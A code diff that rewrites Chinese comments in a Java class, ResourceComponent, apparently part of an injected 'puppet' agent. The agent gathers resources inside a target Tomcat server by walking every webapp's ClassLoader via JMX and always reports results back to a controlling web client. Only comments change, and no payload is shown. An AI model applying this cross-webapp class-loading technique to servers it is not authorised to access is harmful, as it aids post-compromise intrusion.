@@ -24,17 +24,8 @@ import java.util.Set;
  *   <li>{@code h.invoke(null, null, new Object[]{results})} 回写结果</li>
  * </ul>
  *
- * <p>关键设计点（相对历史版本）：
- * <ol>
- *   <li>{@code run()} 用 {@code catch (Throwable)} 兜底，确保 results 永远会被回写，
- *       避免 puppet 返回空响应导致 web 端报「响应解码结果为空」。</li>
- *   <li>不止依赖 contextClassLoader / systemClassLoader：当 puppet 注入位置在 Tomcat
- *       common/shared loader 时，看不到任何 webapp 里的类（filter / servlet 在
- *       WebappClassLoader 里）。这里增加 <b>Tomcat WebappClassLoader 兜底</b>：
- *       通过 PlatformMBeanServer 查 Catalina:j2eeType=WebModule,* 找到每个 webapp 的
- *       ClassLoader 再依次尝试。</li>
- *   <li>puppet 仅回传一份 {@code data}（byte[]），服务端再补齐历史别名。</li>
- * </ol>
+ * <p>{@code run()} 捕获所有目标运行时异常并始终回写结果。资源查找依次使用线程上下文、
+ * 系统以及 Tomcat Webapp ClassLoader。
  *
  * <p>兼容 Java 1.5+，避免使用 lambda、try-with-resources、新集合 API。
  *
@@ -63,7 +54,7 @@ public class ResourceComponent implements Runnable {
             String msg = t.getMessage();
             results.put("msg", msg != null ? msg : t.getClass().getName());
         }
-        // 无论成功失败都必须回写 results，否则 web 端 decode 出空 map 报「响应解码结果为空」
+        // 无论成功失败都回写结构化结果。
         try {
             h.invoke(null, null, new Object[]{results});
         } catch (Throwable ignored) {
@@ -119,7 +110,7 @@ public class ResourceComponent implements Runnable {
         bytes = tryLoad(ClassLoader.getSystemClassLoader(), resourcePath);
         if (bytes != null) return bytes;
 
-        // 3. Tomcat WebappClassLoader 兜底：遍历所有 webapp 的 ClassLoader
+        // 3. 遍历 Tomcat WebappClassLoader
         //    用 PlatformMBeanServer + Catalina:j2eeType=WebModule,* 找到所有 StandardContext，
         //    StandardContext.getLoader().getClassLoader() 就是 webapp CL。
         try {
